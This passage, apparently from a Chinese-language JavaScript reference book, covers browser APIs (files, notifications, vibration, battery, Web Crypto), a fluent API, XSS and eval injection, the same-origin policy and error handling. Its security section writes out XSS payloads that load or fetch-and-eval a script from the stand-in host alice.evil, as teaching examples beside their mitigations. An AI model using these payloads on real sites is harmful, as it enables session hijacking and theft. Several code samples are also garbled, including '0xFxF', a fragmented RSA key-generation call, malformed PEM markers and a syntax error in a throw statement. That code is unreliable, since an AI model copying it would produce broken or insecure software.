  \ * @param {Number} - 块的数量\n * @return {Array} - 一个 Blobs 数组\n */\nfunction sliceFile(file,\
  \ chunksAmount) {\n  var byteIndex = 0;\n  var chunks = [];\n  for (var i = 0; i\
  \ < chunksAmount; i += 1) {\n    var byteEnd = Math.ceil((file.size / chunksAmount)\
  \ * (i + 1));\n    chunks.push(file.slice(byteIndex, byteEnd));\n    byteIndex +=\
  \ (byteEnd - byteIndex);\n  }\n  return chunks;\n}\n```\n\n### 第 89.4 节：获取文件属性\n\
  \n如果你想获取文件的属性（如名称或大小），可以在使用 File Reader 之前完成。如果我们有以下 HTML 代码段：\n\n`<input type=\"\
  file\" id=\"newFile\">`\n\n你可以直接这样访问这些属性：\n\n```javascript\ndocument.getElementById('newFile').addEventListener('change',\
  \ getFile);\nfunction getFile(event) {\n  var files = event.target.files, file =\
  \ files[0];\n  console.log('Name of the file', file.name);\n  console.log('Size\
  \ of the file', file.size);\n}\n```\n\n你也可以轻松地获取以下属性：`lastModified`（时间戳）、`lastModifiedDate`（日期）和\
  \ `type`（文件类型）\n\n### 第 89.5 节：选择多个文件并限制文件类型\n\nHTML5 file API 允许你通过在文件输入上设置 `accept`\
  \ 属性来限制接受的文件类型，例如：\n\n`<input type=\"file\" accept=\"image/jpeg\">`\n\n指定用逗号分隔的多个\
  \ MIME 类型（例如 `image/jpeg,image/png`）或使用通配符（例如 `image/*` 允许所有类型的图像），可以提供一种快速且强大的方法来限制你想选择的文件类型。这是一个允许任何图像或视频的示例：\n\
  \n`<input type=\"file\" accept=\"image/*,video*\">`\n\n默认情况下，文件输入允许用户选择单个文件。如果你想启用多文件选择，只需添加\
  \ `multiple` 属性：\n\n`<input type=\"file\" multiple>`\n\n然后你可以通过文件输入的 `files` 数组读取所有所有选文件。参见将文件读取为\
  \ dataUrl\n\n### 第 89.6 节：使用 Blob 进行客户端 csv 下载\n\n```javascript\nfunction downloadCsv()\
  \ {\n  var blob = new Blob([csvString]);\n  if (window.navigator.msSaveOrOpenBlob)\
  \ {\n    window.navigator.msSaveBlob(blob, \"filename.csv\");\n  } else {\n    var\
  \ a = window.document.createElement(\"a\");\n    a.href = window.URL.createObjectURL(blob,\
  \ { type: \"text/plain\" });\n  }\n}\n```\n\n### 第 90 节：通知\n\n#### 第 90.1 节：请求权限\n\
  \n我们使用 `requestPermission` 来询问用户是否想要接收通知。\n\n```javascript\nNotification.requestPermission().then(function(permission)\
  \ {\n  if (permission === 'granted') {\n    // 用户批准\n  } else if (permission ===\
  \ 'denied') {\n    // 用户拒绝\n  } else {\n    // 用户未做决定\n  }\n});\n```\n\n#### 第 90.2\
  \ 节：发送通知\n\n在用户批准发送通知的权限后，我们可以发送一个向用户说 Hello 的简单通知：\n\n```javascript\nnew Notification('Hello',\
  \ { body: 'Hello, world!', icon: 'url to an image' });\n```\n\n这将发送一条如下所示的通知：\n\n\
  Hello\nHello, world!\n\n#### 第 90.3 节：关闭通知\n\n你可以通过 `close()` 方法关闭通知。\n\n```javascript\n\
  let notification = new Notification(title, options);\n// 执行一些工作，然后关闭通知\nnotification.close();\n\
  ```\n\n你可以利用 `setTimeout` 函数来自动关闭通知。\n\n```javascript\nlet notification = new Notification(title,\
  \ options);\nsetTimeout(() => {\n  notification.close();\n}, 4000);\n```\n\n上述代码将产生一个通知并在\
  \ 4 秒后将其关闭。\n\n#### 第 90.4 节：通知事件\n\nNotification API 规范支持由 `Notification` 触发的 2\
  \ 个事件。\n\n1. `click` 事件。\n\n当你点击通知主体时，会运行此事件（排除关闭 X 按钮和通知配置按钮）。\n\n示例：\n\n```javascript\n\
  notification.onclick = function(event) {\n  console.debug(\"you click me and this\
  \ is my event object: \", event);\n}\n```\n\n2. `error` 事件\n\n当发生任何错误时（例如无法显示），通知将触发此事件。\n\
  \n```javascript\nnotification.onerror = function(event) {\n  console.debug(\"There\
  \ was an error: \", event);\n}\n```\n\n### 第 91 节：Vibration API\n\n现代移动设备包含用于振动的硬件。Vibration\
  \ API 为 Web 应用提供了访问这些硬件的能力（如果存在），如果设备不支持则什么都不做。\n\n#### 第 91.1 节：单次振动\n\n让设备振动 100ms：\n\
  \n```javascript\nwindow.navigator.vibrate(100);\n```\n\n或者\n\n```javascript\nwindow.navigator.vibrate([100]);\n\
  ```\n\n#### 第 91.2 节：检查支持情况\n\n检查浏览器是否支持振动\n\n```javascript\nif ('vibrate' in window.navigator)\
  \ {\n  // 浏览器支持振动\n} else {\n  // 不支持\n}\n```\n\n#### 第 91.3 节：振动模式\n\n\n\n\n\n\
  一个值数组描述了设备振动和不振动的时间段。`window.navigator.vibrate([200, 100, 200])`\n\n# 第 92 章：电池状态\
  \ API\n\n## 第 92.1 节：电池事件\n\n```javascript\n// 获取电池 API\nnavigator.getBattery().then(function(battery)\
  \ {\n  battery.addEventListener('chargingchange', function(){\n    console.log(\
  \ '新的充电状态: ', battery.charging );\n  });\n\n  battery.addEventListener('levelchange',\
  \ function(){\n    console.log( '新的电量: ', battery.level * 100 + \"%\" );\n  });\n\
  \n  battery.addEventListener('chargingtimechange', function(){\n    console.log(\
  \ '剩余充满时间: ', battery.chargingTime, \" 秒\" );\n  });\n\n  battery.addEventListener('dischargingtimechange',\
  \ function(){\n    console.log( '剩余放电时间: ', battery.dischargingTime, \" 秒\" );\n\
  \  });\n});\n```\n\n## 第 92.2 节：获取当前电量\n\n```javascript\n// 获取电池 API\nnavigator.getBattery().then(function(battery)\
  \ {\n  // 电池电量在 0 到 1 之间，所以我们乘以 100 转换为百分比\n  console.log(\"电量: \" + battery.level\
  \ * 100 + \"%\");\n});\n```\n\n## 第 92.3 节：电池正在充电吗？\n\n```javascript\n// 获取电池 API\n\
  navigator.getBattery().then(function(battery) { \n  if (battery.charging) {\n  \
  \  console.log(\"电池正在充电\"); \n  } else {\n    console.log(\"电池正在放电\"); \n  }\n});\n\
  ```\n\n## 第 92.4 节：获取电池电量的剩余时间\n\n```javascript\n// 获取电池 API\nnavigator.getBattery().then(function(battery)\
  \ {\n  console.log( \"电池将在 \", battery.dischargingTime, \" 秒后耗尽\" ); \n});\n```\n\
  \n## 第 92.5 节：获取电池充满所需的剩余时间\n\n```javascript\n// 获取电池 API\nnavigator.getBattery().then(function(battery)\
  \ {\n  console.log( \"电池将在 \", battery.chargingTime, \" 秒后充满电\" ); \n});\n```\n\n\
  # 第 93 章：流式 API (Fluent API)\n\nJavaScript 非常适合设计流式 API —— 一种面向消费者的、关注开发者体验的 API。结合语言的动态特性可以获得最佳效果。\n\
  \n## 第 93.1 节：使用 JS 构造 HTML 文章的流式 API\n\n版本 ≥ 6\n\n```javascript\nclass Item {\n\
  \  constructor(text, type) {\n    this.text = text;\n    this.emphasis = false;\n\
  \    this.type = type;\n  }\n\n  toHtml() {\n    return `<${this.type}>${this.emphasis\
  \ ? '<em>' : ''}${this.text}${this.emphasis ? '</em>' : ''}</${this.type}>`;\n \
  \ }\n}\n\nclass Section {\n  constructor(header, paragraphs) {\n    this.header\
  \ = header;\n    this.paragraphs = paragraphs;\n  }\n\n  toHtml() {\n    return\
  \ `<section><h2>${this.header}</h2>${this.paragraphs.map(p => p.toHtml()).join('')}</section>`;\n\
  \  }\n}\n\nclass List {\n  constructor(text, items) {\n    this.text = text;\n \
  \   this.items = items;\n  }\n\n  toHtml () {\n    return `<ol><h2>${this.text}</h2>${this.items.map(i\
  \ => i.toHtml()).join('')}</ol>`;\n  }\n}\n\nclass Article {\n  constructor(topic)\
  \ { \n    this.topic = topic; \n    this.sections = []; \n    this.lists = [];\n\
  \  }\n\n  section (text) {\n    const section = new Section(text, []); \n    this.sections.push(section);\n\
  \    this.lastSection = section;\n    return this;\n  }\n\n  list (text) {\n   \
  \ const list = new List(text, []); \n    this.lists.push(list);\n    this.lastList\
  \ = list;\n    return this;\n  }\n\n  addParagraph (text) {\n    const paragraph\
  \ = new Item(text, 'p'); \n    this.lastSection.paragraphs.push(paragraph); \n \
  \   this.lastItem = paragraph;\n    return this;\n  }\n\n  addListItem (text) {\n\
  \    const listItem = new Item(text, 'li'); \n    this.lastList.items.push(listItem);\
  \ \n    this.lastItem = listItem;\n    return this;\n  }\n\n  withEmphasis () {\n\
  \    this.lastItem.emphasis = true; \n    return this;\n  }\n\n  toHtml() {\n  \
  \  return `<article><h1>${this.topic}</h1>${this.sections.map(s => s.toHtml()).join('')}${this.lists.map(l\
  \ => l.toHtml()).join('')}</article>`; \n  }\n}\n\nArticle.withTopic = topic =>\
  \ new Article(topic);\n```\n\n这使得 API 的消费者可以使用原生 JS 构造出美观的文章，几乎就像是为此目的设计的领域特定语言（DSL）：\n\
  \n版本 ≥ 6\n\n```javascript\nconst articles = [\n  Article.withTopic('人工智能 - 概览')\n\
  \    .section('什么是人工智能？')\n    .addParagraph('某些内容')\n    .addParagraph('Lorem ipsum')\n\
  \    .withEmphasis()\n    .section('人工智能哲学')\n    .addParagraph('关于人工智能哲学的某些')\n\
  \    .addParagraph('结论'),\n\n  Article.withTopic('JavaScript')\n    .list('JavaScript\
  \ 是所有 Web 开发者必须学习的 3 种语言之一：')\n    .addListItem('HTML 用于定义网页内容')\n    .addListItem('CSS\
  \ 用于指定网页布局')\n    .addListItem(' JavaScript 用于编写网页行为')\n];\n\ndocument.getElementById('content').innerHTML\
  \ = articles.map(a => a.toHtml()).join('\\n');\n```\n\n# 第 94 章：Web 密码用学 API (Web\
  \ Cryptography API)\n\n## 第 94.1 节：创建摘要（例如 SHA-256）\n\n```javascript\n// 将字符串转换为\
  \ ArrayBuffer。只有当你想要对字符串进行哈希时才需要此步，如果你已经得到了像 Uint8Array 这样的 ArrayBuffer。\nvar input\
  \ = new TextEncoder('utf-8').encode('Hello world!');\n\n// 计算 SHA-256 摘要\ncrypto.subtle.digest('SHA-256',\
  \ input)\n  // 等待完成\n  .then(function(digest) {\n    // digest 是一个 ArrayBuffer。有多种处理方式。\n\
  \    // 如果 digest 是一个 ArrayBuffer。有多种处理方式。\n    var view = new DataView(digest);\n\
  \    var hexstr = '';\n    for (var i = 0; i < view.byteLength; i++) {\n      hexstr\
  \ += '0123456789abcdef'.charAt(view.getUint8(i) >> 4) +\n                '0123456789abcdef'.charAt(view.getUint8(i)\
  \ & 0xFxF);\n    }\n    console.log(hexstr);\n  })\n```\n\n### 94.2\n\n```javascript\n\
  // 创建一个固定大小和类型的数组。\nvar array = new Uint8Array(5);\n\n// 生成加密随机值\ncrypto.getRandomValues(array);\n\
  \n// 将数组打印到控制台\nconsole.log(array);\n```\n\n`crypto.getRandomValues` 可以配合以下类（在“二进制数据”中进一步描述）实例使用，并从给定的范围内生成值：`Int8Array`、`Int16Array`、`Int32Array`、`Uint8Array`、`Uint16Array`、`Uint32Array`。\n\
  \n## 94.3 节：生成 RSA 密钥对转换为 PEM 格式\n\n在此示例中，你将学习如何生成 RSA-OAEP 密钥对，并将私钥转换为 base64 格式以便与\
  \ OpenSSL 等使用。请注意，此过程也适用于公钥，只需使用下面的前缀和后缀：\n\n---- PUBLIC----\n\n---- PUBLIC KEY----\n\
  \n注意：此示例在以下浏览器中经过充分测试：Chrome、Firefox、Opera、Vivaldi\n\n```javascript\nfunction arrayBufferToBase64(arrayBuffer)\
  \ {\n  var byteArray = new Uint8Array(arrayBuffer);\n  var byteString = '';\n  for\
  \ (var i=0; i < byteArray.byteLength; i++) {\n    byteString += String.fromCharCode(byteArray[i]);\n\
  \  }\n  var b64 = window.btoa(byteString);\n  return b64;\n}\n\nfunction addNewLines(str)\
  \ {\n  var finalString = '';\n  while(str.length > 0) {\n    finalString += str.substring(0,\
  \ 64) + '\\n';\n    str = str.substring(64);\n  }\n  return finalString;\n}\n\n\
  function toPem(privateKey) {\n  var b64 = addNewLines(arrayBufferToBase64(privateKey));\n\
  \  var pem = \"-----BEGIN PRIVATE KEY----\\n\" + b64 + \"-----END PRIVATE KEY-----\"\
  ;\n  return pem;\n}\n\n// 让我们生成密钥对\nwindow.crypto.subtle.generateKey(\n{\n  name:\
  \ \"RSA-OAEP\",\n```\n\n\n\n\n`modulusLength: 2048, // 可以是 1024, 2048 或 4096` `publicExponent:\
  \ new Uint8Array([0x01, 0x00, 0x01]), hash: {name: \"SHA-256\"} // 或 SHA-512`\n\n\
  },\n\n`true`,\n\n[\"encrypt\", \"decrypt\"]\n\n) .then(function(keyPair) {\n\n/*\
  \ 现在当密钥对生成后，我们将从 pkcs8 的 keypair 对象中将其导出 */\n\n/*`\n\n```javascript\nwindow.crypto.subtle.exportKey(\n\
  \  \"pkcs8\",\n  keyPair.privateKey\n).then(function(exportedPrivateKey) {\n  //\
  \ 将导出的私钥转换为 PEM 格式\n  var pem = toPem(exportedPrivateKey);\n  console.log(pem);\
  \ \n}).catch(function(err) {\n  console.log(err); \n});\n\n```\n\n这就搞定定！现在你有了一个完全可用且兼容的\
  \ PEM 格式 RSA-OAEP 私钥，你可以在任何地方使用它。尽情享受吧！\n\n## 94.4 节：将 PEM 密钥对转换为 CryptoKey\n\n\
  那么，你是否想过如何在 Web Cryptography API 中使用由 OpenSSL 生成的 PEM RSA 密钥对？如果答案是肯定的，太好了！你即将知道了。\n\
  \n注意：此过程也适用于公钥，你只需要将前缀和后缀改为：\n\n-----BEGIN PUBLIC KEY----\n-----END PUBLIC KEY----\n\
  \n此示例假设你已经生成了 PEM 格式的 RSA 密钥对。\n\n```javascript\nfunction removeLines(str) {\n \
  \ return str.replace(\"\\n\", \"\");\n}\n\nfunction base64ToArrayBuffer(b64) {\n\
  \  var byteString = window.atob(b64);\n  var byteArray = new Uint8Array(byteString.length);\n\
  \  for (var i=0; i < byteString.length; i++) {\n    byteArray[i] = byteString.charCodeAt(i);\n\
  \  }\n  return byteArray;\n}\n\nfunction pemToArrayBuffer(pem) {\n  var b64Lines\
  \ = removeLines(pem);\n  var b64Prefix = b64Lines.replace('-----BEGIN PRIVATE KEY-----',\
  \ '');\n  var b64Final = b64Prefix.replace('-----END PRIVATE KEY-----', '');\n \
  \ return base64ToArrayBuffer(b64Final);\n}\n\nwindow.crypto.subtle.importKey(\n\
  \  \"pkcs8\",\n  pemToArrayBuffer(yourprivatekey),\n  {\n    name : \"RSA-OAEP\"\
  ,\n    hash: {name: \"SHA-256\"} // 或 SHA-512\n  },\n  true,\n  [\"decrypt\"]\n\
  ).then(function(importedPrivateKey) {\n  console.log(importedPrivateKey);\n}).catch(function(err)\
  \ {\n  console.log(err);\n});\n```\n\n现在你已经完成了！你可以在 WebCrypto API 中使用你导入的密钥。\n\n\
  ## 95 章：安全问题\n\n这是一个常见的 JavaScript 安全问题集合，例如 XSS 和 eval 注入。该集合还包含了如何缓解这些安全问题。\n\n\
  ## 95.1 节：反射型跨站脚本 (XSS)\n\n假设 Joe 拥有一个网站，允许你登录、查看小幼狗视频并将其保存到你的账户中。\n\n每当用户在该网站上搜索时，他们会被重定向到\
  \ `https://example.com/search?q=brown+puppies`。\n\n如果用户的搜索没有匹配到任何内容，他们会看到类似下面的消息：\n\
  \n您的搜索 (brown puppies) 没有匹配到任何内容。请重试。\n\n在后端，该消息显示如下：\n\n```javascript\nif (!searchResults){\n\
  \  webPage += \"<div>Your search (<b>\" + searchQuery + \"</b>), didn't match anything.\
  \ Try again.\";\n}\n```\n\n然而，当 Alice 搜索 `<h1>headings</h1>` 时，她得到了返回：\n\n您的搜索 (headings)\
  \ 没有匹配到任何内容。请重试。\n\n原始 HTML:\n您的搜索 (<b><h1>headings</h1></b>) 没有匹配到任何内容。请重试。\n\n\
  接着 Alice 搜索 `<script>alert(1)</script>`，她看到：\n\n您的搜索 (), 没有匹配到任何内容。请重试。\n\n以及：\n\
  \n![](img/image00707.jpeg)接着 Alice 搜索 `<script src = \"https://alice.evil/puppy_xss.js></script>`\
  \ 真正可爱的小幼狗，并复制了地址栏中的链接，然后发邮件给了 Bob：\n\nBob，\n\n当我搜索可爱的小幼狗时，什么都没有发生！\n\n接着 Alice\
  \ 成功地让 Bob 在登录账户的情况下运行了她的脚本。\n\n**缓解措施：**\n\n1. 在没有结果时，返回搜索词之前，对搜索词中的所有角括号进行转义。\n\
  2. 在没有结果时，不要返回搜索词。\n3. **添加内容安全策略 (CSP)，拒绝从其他域加载活动内容。**\n\n## 95.2 节：存储型跨站脚本 (XSS)\n\
  \n假设 Bob 拥有一个社交网站，允许用户个性化他们的个人资料。\n\nAlice 访问 Bob 的网站，创建一个账户，并进入个人资料设置。她将个人资料描述设置为我其实太懒了不想在这里写点什么。\n\
  \n当她的朋友查看她的个人资料时，这段代码会在服务器上运行：\n\n```javascript\nif (viewedPerson.profile.description){\n\
  \  page += \"<div>\" + viewedPerson.profile.description + \"</div\";\n}else{\n \
  \ page += \"<div>This person doesn't have a profile description.</div>\";\n}\n```\n\
  \n导致生成的 HTML：`<div>I'm actually too lazy to write something here.</div>`\n\n接着 Alice\
  \ 将个人资料描述设置为 `<b>I like HTML</b>`。当她访问自己的个人资料时，她看到的不是\n\n<b>I like HTML</b>\n\n\
  而是看到\n\nI like HTML\n\n然后 Alice 将她的个人资料设置为\n\n`<script src = \"https://alice.evil/profile_xss.js\"\
  ></script>I'm actually too lazy to write something here. `\n\n每当有人访问她的个人资料时，他们就会在\
  \ Bob 的网站上以其账户身份登录状态，并在 Bob 的网站上运行 Alice 的脚本。\n\n**缓解措施**\n\n1. 对个人资料描述等中的角括号进行转义。\n\
  2. 将个人资料描述存储在纯文本文件中，通过脚本获取该文件并通过 `.innerText` 添加描述。\n3. **添加内容安全策略 (CSP)，拒绝从其他域加载活动内容。**\n\
  \n## 95.3 节：来自 JavaScript 字符串字面量的存储型跨站脚本\n\n假设 Bob 拥有一个允许你发布公共消息的网站。\n\n消息由如下脚本加载：\n\
  \n```javascript\naddMessage (\"Message 1\");\naddMessage(\"Message 2\");\naddMessage(\"\
  Message 3\");\naddMessage(\"Message 4\");\naddMessage(\"Message 5\");\naddMessage(\"\
  Message 6\");\n```\n\n`addMessage` 函数将发布的消息添加到 DOM。然而，为了避免 XSS，**消息中的任何 HTML 都经过了转义。**\n\
  \n脚本在服务器上生成的如下：\n\n```javascript\nfor (var i = 0; i < messages.length; i++){\n \
  \ script += \"addMessage(\\\"\" + messages[i] + \"\\\");\n}\n```\n\n所以 Alice 发布了一条这样的消息：妈妈说：“生活很不错。”\
  \ 当她预览消息时，她看到的不是她的消息，而是控制台中的一个错误：\n\nUncaught SyntaxError: missing ) after argument\
  \ list\n\n为什么？因为生成的脚本如下：\n\n```javascript\naddMessage(\"My mom said: \"Life is good.\
  \ Makes it better. \"\");\n```\n\n这是一个语法错误。接着 Alice 发布了：\n\n`I like pie \");fetch(\"\
  https://alice.evil/js_xss.js\").then(x=>x.text()).then(eval);//`\n\n那么生成的脚本如下：\n\
  \n```javascript\naddMessage(\"I like pie \");fetch(\"https://alice.evil/js_xss.js\"\
  ).then(x=>x.text()).then(eval);//\");\n```\n\n这添加了消息 I like pie，但每当有人访问 Bob 的网站时，它都会下载并运行\
  \ `https://alice.evil/js_xss.js`。\n\n**缓解措施：**\n\n1. 将发布的消息传递给 `JSON.stringify()`\n\
  2. 不要动态构建脚本，而是构建包含所有消息的纯文本文件，然后由脚本进行获取。\n3. **添加内容安全策略 (CSP)，拒绝从其他域加载活动内容。**\n\n\
  \n\n\n假设每当有人访问 Bob 网站上的个人资料时，都会获取以下 URL：\n\n`https://example.com/api/users/1234/profiledata.json`\n\
  \n得到如下响应：\n\n```json\n{\n  \"name\": \"Bob\",\n  \"description\": \"Likes pie &\
  \ security holes.\"\n}\n```\n\n然后对数据进行解析并插入：\n\n`var data = eval(\"(\" + resp +\
  \ \")\");`\n\n```javascript\ndocument.getElementById(\"#name\").innerText = data.name;\n\
  document.getElementById(\"#description\").innerText = data.description;\n```\n\n\
  看起来很不错，对吧？**错了。**\n\n如果某人的描述是 `Likes XSS.\"});alert(1);({\"name\":\"Alice\",\"description\"\
  :\"Likes XSS.? 看起来奇怪，但如果处理不当，响应将会是：\n\n```json\n{ \"name\": \"Alice\",\n\"description\"\
  : \"Likes pie & security holes.\"});alert(1);({\"name\":\"Alice\",\"description\"\
  :\"Likes XSS.\"}\n```\n\n并且这会被 eval：\n\n```javascript\n({ \"name\": \"Alice\",\n\
  \"description\": \"Likes pie & security holes.\"});alert(1);({\"name\":\"Alice\"\
  ,\"description\":\"Likes XSS.\"})\n```\n\n如果你认为这没问题，请将其粘贴到你的控制台中看看发生了什么。\n\n## 缓解措施\n\
  \n**使用 `JSON.parse` 代替 `eval` 来获取 JSON。** 通常情况下，不要使用 `eval`，绝对不要对用户可以控制的内容使用 `eval`。`eval`\
  \ 会创建一个新的执行上下文，导致**性能损耗**。\n\n在将用户数据放入 JSON 之前，正确转义 `\"` 和 `\\`。如果你只转义了 `\"`，就会发生这种情况：\n\
  \n`Hello! \\\"});alert(1);({`\n\n会被转换为：\n\n`\"Hello! \\\\\"});alert(1);({\" Oops.\
  \ 记住要同时转义 `\\` 和 `\"`，或者直接使用 `JSON.parse`。\n\n## 第 96 章：同源策略与跨域通信\n\n 浏览器使用同源策略防止脚本访问远程内容，除非远程地址与脚本具有相同的**源**。这防止了恶意脚本向其他网站发送请求以获取敏感数据。\n\
  \n如果两个 URL 具有相同的 `protocol`（协议）、`hostname`（主机名）和 `port`（端口），则认为这两个地址的**源**是相同的。\n\
  \n### 96.1 节：使用消息进行安全的跨域通信\n\n`window.postMessage()` 方法结合其相对事件处理器 `window.onmessage`\
  \ 可以安全地实现跨域通信。\n\n可以调用目标 `window` 的 `postMessage()` 方法向另一个窗口发送消息，该窗口将能够通过 `onmessage`\
  \ 事件处理器拦截消息、对其进行处理，并在必要时再次使用 `postMessage()` 向发送者窗口发送响应。\n\n#### 窗口与子框架间通信的示例\n\n\
  `http://main-site.com/index.html` 的内容：\n\n```html\n<!-- ... -->\n<iframe id=\"frame-id\"\
  \ src=\"http://other-site.com/index.html\"></iframe> \n<script src=\"main_site_script.js\"\
  ></script>\n<!-- ... -->\n```\n\n`http://other-site.com/index.html` 的内容：\n\n```html\n\
  <!-- ... -->\n<script src=\"other_site_script.js\"></script> \n<!-- ... -->\n```\n\
  \n`main_site_script.js` 的内容：\n\n```javascript\n// 获取 <iframe> 的窗口\nvar frameWindow\
  \ = document.getElementById('frame-id').contentWindow;\n\n// 为响应添加监听器\nwindow.addEventListener('message',\
  \ function(evt) {\n  // 重要：检查数据的源！\n  if (event.origin.indexOf('http://other-site.com')\
  \ == 0) {\n    // 检查响应 console.log(evt.data); \n  }\n});\n\n// 向框架窗口发送消息\nframeWindow.postMessage(obj,\
  \ '*');\n```\n\n`other_site_script.js` 的内容：\n\n```javascript\nwindow.addEventListener('message',\
  \ function(evt) {\n  // 重要：检查数据的源！\n  if (event.origin.indexOf('http://main-site.com')\
  \ == 0) {\n    // 读取并处理收到的数据 console.log(evt.data);\n    // 向主窗口发送响应 \n    window.parent.postMessage(obj,\
  \ '*'); \n  }\n});\n```\n\n### 96.2 节：绕过同源策略的方法\n\n对于客户端 JavaScript 引擎（运行在浏览器内部的引擎）来说，目前没有简单的解决方案可以请求当前域名以外的源。（顺便说一下，这种限制在\
  \ Node JS 等 JavaScript 服务端工具中并不存在。）\n\n然而，在某些情况下，确实可以使用以下方法从其他源检索数据。请注意，其中某些方法可能是黑科技或规通方法。\n\
  \n**方法 1：CORS**\n\n跨域资源共享。现在的大多数 API 都允许设置头部（Access-Control-Allow-Origin）。这防止了来自其他域名的恶意脚本。\n\
  \n**方法 2：JSONP**\n\nJSON 填充通常用于绕过此限制。它利用了 `<script>` 标签可以从任何域加载。这存在风险。\n\n## 第 97\
  \ 章：错误处理\n\n### 97.1 节：错误对象\n\nJavaScript 中的运行时错误是 `Error` 对象的实例。`Error` 对象可以直接使用，也可以作为自定义异常的基类。你可以抛出任何类型的值——例如字符串——但强烈建议使用\
  \ `Error` 或其派生类，以确保调试信息（如堆栈跟踪）被正确保留。\n\n`Error` 构造函数的第一个参数是人类可读的错误消息。你应该尝试始终指定一个有用的错误消息来说出了什么问题，即使可以在其他地方找到额外信息。\n\
  \n```javascript\ntry {\n  throw new Error('Useful message');\n} catch (error) {\n\
  \  console.log('Something went wrong! ' + error.message);\n}\n```\n\n### 97.2 节：与\
  \ Promise 的交互\n\n版本 ≥ 6\n\n异常对于同步代码的关系，就像拒绝（rejection）对于基于 Promise 的异步代码的关系。如果在\
  \ Promise 处理器中抛出异常，它的错误将被自动捕获并用于拒绝该 Promise。\n\n```javascript\nPromise.resolve(5)\n\
  \  .then(result => {\n    throw \"I don't like five\");\n  })\n  .then(result =>\
  \ {\n    console.info(\"Promise resolved: \" + result);\n  })\n  .catch(error =>\
  \ {\n    console.error(\"Promise rejected: \" + error);\n  });\n```\n\n版本 > 7\n\n\
  async 函数提案（预计成为 ECMAScript 2017 的一部分）从相反方向扩展了这一点。如果你 await 一个被拒绝的 promise，它的错误将作为异常抛出：\n\
  \n```javascript\nasync function main() {\n  try {\n    await Promise.reject(new\
  \ Error(\"Invalid something\"));\n  } catch (error) {\n    console.log(\"Caught\
  \ error: \" + error);\n  }\n}\n\nmain();\n```\n\n### 97.3 节：错误类型\n\nJavaScript 中有六种特定的核心错误构造函数：\n\
  \n\n\n\n\n`EvalError` - 创建一个表示关于全局函数 `eval()` 发生错误的实例。\n\n`InternalError` - 创建一个表示当\
  \ JavaScript 引擎抛出内部错误时发生错误的实例。例如“递归过多”。（仅由 **Mozilla Firefox** 支持）\n\n`RangeError`\
  \ - 创建一个表示当数值变量或参数超出其有效范围时发生错误的实例。\n\n`ReferenceError` - 创建一个表示在引用无效引用时发生错误的实例。\n\
  \n`SyntaxError` - 创建一个表示在 `eval()` 中解析代码时发生语法错误的实例。\n\n`TypeError` - 创建一个表示当变量或参数不是有效类型时发生错误的实例。\n\
  \n`URIError` - 创建一个表示向 `encodeURI()` 或 `decodeURI()` 传递无效参数时发生错误的实例。\n\n如果你正在实现错误处理机制，可以从代码检查你捕获的是哪种错误。\n\
  \n```javascript\ntry {\n  throw new TypeError();\n} catch (e){\n  if(e instanceof\
  \ Error){\n    console.log('instance of general Error constructor');\n  }}\n  if\
  \ (e instanceof TypeError) {\n    console.log('type error');\n  }}\n```\n\n在这种情况下，`e`\
  \ 将是 `TypeError` 的实例。所有错误类型都继承自构造函数 `Error`，因此它也是 `Error` 的实例。\n\n记住这一点告诉我们，在大多数情况下检查\
  \ `e` 是否为 `Error` 实例是没用的。\n\n## 第 97.4 节：操作顺序及高级思考\n\n没有 try catch 块的情况下，未定义的函数将抛出错误并停止执行：\n\
  \n```javascript\nundefinedFunction(\"This will not get executed\");\nconsole.log(\"\
  I will never run because of the uncaught error!\");\n```\n\n将抛出错误且不运行第二行：\n\n```javascript\n\
  // Uncaught ReferenceError: undefinedFunction is not defined\n```\n\n你需要一个类似于其他语言的\
  \ try catch 块，以确保捕获该错误，以便代码继续执行：\n\n```javascript\ntry {\n  undefinedFunction(\"\
  This will not get executed\");\n} catch(error) {\n  console.log(\"An error occurred!\"\
  , error);\n} finally {\n  console.log(\"The code-block has finished\");\n}\nconsole.log(\"\
  I will run because we caught the error!\");\n```\n\n现在，我们捕获了错误，并可以确定代码将执行：\n\n```javascript\n\
  // An error occurred! ReferenceError: undefinedFunction is not defined(**) // The\
  \ code-block has finished\n// I will run because we caught the error!\n```\n\n如果我们的\
  \ catch 块中发生了错误怎么办！？\n\n```javascript\ntry {\n  undefinedFunction(\"This will not\
  \ get executed\");\n} catch(error) {\n  otherUndefinedFunction(\"Uh oh... \");\n\
  \  console.log(\"An error occurred!\", error);\n} finally {\n  console.log(\"The\
  \ code-block has finished\");\n}\nconsole.log(\"I won't run because of the uncaught\
  \ error in the catch block!\");\n```\n\n我们将不会处理 catch 块的剩余部分，除了 finally 块外，执行将停止。\n\
  \n```javascript\n// The code-block has finished\n// Uncaught ReferenceError: otherUndefinedFunction\
  \ is not defined(*)\n```\n\n你总是可以嵌套 try catch 块……但你不应该这样做，因为那会变得极其混乱……\n\n```javascript\n\
  try {\n  undefinedFunction(\"This will not get executed\");\n} catch(error) {\n\
  \  try {\n    otherUndefinedFunction(\"Uh oh... \");\n  } catch(error2) {\n    console.log(\"\
  Too much nesting is bad for my heart and soul...\");\n  }\n  console.log(\"An error\
  \ occurred!\", error);\n} finally {\n  console.log(\"The code-block has finished\"\
  );\n}\nconsole.log(\"I will run because we caught the error!\");\n```\n\n将捕获上一个示例中的所有错误并记录以下：\n\
  \n```javascript\n//Too much nesting is bad for my heart and soul...\n//An error\
  \ occurred! ReferenceError: undefinedFunction is not defined(**) //The code-block\
  \ has finished\n// I will run because we caught the error!\n```\n\n那么，我们如何捕获所有错误！？对于未定义的变量和函数：你做不到。此外，你不应该将每个变量和函数包装在\
  \ try/catch 块中，因为这些是简单的示例，在修复它们之前只会发生一次。然而，对于你已知存在的对象、函数和其他变量，但你不确定它们的属性、子进程或副作用是否存在，或者你预计在某些情况下会出现某些错误状态，你应该以某种方式抽象你的错误处理。这里有一个非常基础的示例和实现。\n\
  \n在没有保护的方法来调用不可信或抛出异常的方法时：\n\n```javascript\nfunction foo(a, b, c) {\n  console.log(a,\
  \ b, c);\n  throw new Error(\"custom error!\");\n}\n\ntry {\n  foo(1, 2, 3);\n}\
  \ catch(e) {\n  try {\n    foo(4, 5, 6);\n  } catch(e2) {\n    console.log(\"We\
  \ had to nest because there's currently no other way...\");\n  }\n  console.log(e);\n\
  }\n// 1 2 3\n// 4 5 6\n// We had to nest because there's currently no other way...\n\
  // Error: custom error!(**)\n```\n\n而有了保护：\n\n```javascript\nfunction foo(a, b,\
  \ c) {\n  console.log(a, b, c);\n  throw new Error(\"custom error!\");\n}\n\nfunction\
  \ protectedFunction(fn, ...args) {\n  try {\n    fn.apply(this, args);\n  } catch\
